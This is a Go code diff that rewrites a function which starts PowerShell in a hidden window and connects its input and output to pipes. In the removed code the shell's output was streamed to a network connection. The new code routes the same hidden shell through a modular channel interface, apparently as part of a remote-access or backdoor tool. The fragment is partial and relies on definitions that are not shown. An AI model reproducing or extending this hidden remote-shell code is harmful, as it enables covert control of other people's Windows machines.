@@ -3,24 +3,19 @@
 package main
 
 import (
-	"io"
 	"log"
-	"net"
 	"os/exec"
 	"syscall"
 )
 
-type Shell struct {
-	placeholder bool
-	finished    chan error
-	command     *exec.Cmd
-	outpipe     io.ReadCloser
-	inpipe      io.WriteCloser
-	errpipe     io.ReadCloser
+type ShellError struct{}
+
+func (e *ShellError) Error() string {
+	return "shell error"
 }
 
-func initShell(conn net.Conn) *Shell {
-	log.Println("loading shell")
+func init_shell() (*Module, error) {
+	log.Println("loading system shell")
 	command := exec.Command("powershell")
 	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	outpipe, err1 := command.StdoutPipe()
@@ -28,24 +23,29 @@ func initShell(conn net.Conn) *Shell {
 	errpipe, err3 := command.StderrPipe()
 
 	if err1 != nil || err2 != nil || err3 != nil {
-		log.Fatal(err1.Error(), err2.Error(), err3.Error())
+		log.Println(err1.Error(), err2.Error(), err3.Error())
+		return nil, &ShellError{}
 	}
 
-	shell := &Shell{
-		placeholder: false,
-		finished:    make(chan error, 1),
-		command:     command,
-		outpipe:     outpipe,
-		inpipe:      inpipe,
-		errpipe:     errpipe,
+	module := &Module{
+		finished: make(chan bool, 1),
+		name:     "shell",
+		external: true,
+		args:     []string{},
+		in:       make(chan string, 1),
+		out:      make(chan string, 1),
+		err:      make(chan string, 1),
 	}
-	go readPipe(shell.outpipe, conn)
-	go readPipe(shell.errpipe, conn)
+
+	go readPipe(outpipe, module.out)
+	go readPipe(errpipe, module.err)
+	go writePipe(inpipe, module.in)
 	go func() {
-		shell.finished <- shell.command.Run()
-		log.Println("finish !!")
+		command.Run()
+		module.finished <- true
+		log.Println("module finished: ", module.name)
 	}()
 	log.Println("shell started")
 
-	return shell
+	return module, nil
 }
